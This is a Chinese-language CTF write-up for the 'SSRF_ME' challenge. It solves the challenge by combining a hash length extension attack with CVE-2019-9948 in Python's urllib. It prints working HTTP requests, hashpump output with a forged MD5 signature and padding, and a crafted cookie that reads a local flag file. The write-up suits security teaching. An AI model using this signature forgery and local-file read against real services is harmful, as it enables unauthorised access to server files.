[中文](./README_zh.md) [English](./README.md)

[docker](./docker.zip)

# SSRF_ME 题解

## 预期解法:

哈希长度拓展攻击+CVE-2019-9948(urllib)

---
## 题解:
代码很简单,主要是有根据传入的action参数判断,有两种模式,一种是请求Param参数的地址,并把结果写入`result.txt`,另一种是读取`result.txt`的内容,两种方式都需要`sign`值校验.并且`sign`值是通过拼接参数哈希加密,所以可以使用哈希长度拓展攻击.题目给出了`scan`模式的`sign`值.


1. 获取`scan`模式的`sign`值.
```
GET /geneSign?param=local-file:flag.txt HTTP/1.1
Host: 139.180.128.86



HTTP/1.1 200 OK
Server: nginx/1.15.8
Content-Length: 32
Connection: close

51796b52dd6e1108c89b7d5277d3ae0a
```
2. 使用`hashpump`生成新的`sign`值.
```
$ hashpump
Input Signature: 51796b52dd6e1108c89b7d5277d3ae0a
Input Data: local-file:flag.txtscan
Input Key Length: 16
Input Data to Add: read
eafd6ccd634ec29886babc843f1d8b86                                                                                        
local-file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read
```
3. 把新生成的参数中`\x`替换成`%`,然后提交,即可获取flag
```
GET /De1ta?param=local-file:flag.txt HTTP/1.1
Host: 139.180.128.86
Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read;sign=eafd6ccd634ec29886babc843f1d8b86
Connection: close




HTTP/1.1 200 OK
Server: nginx/1.15.8
Content-Type: text/html; charset=utf-8
Content-Length: 65
Connection: close

{"code": 200, "data": "de1ctf{27782fcffbb7d00309a93bc49b74ca26}"}
```


## 写在最后:
由于出题时候的粗心,导致题目产生非预期,在这里说一声抱歉.还是太菜了.像各位师傅学习.最后希望大家喜欢本次的比赛.
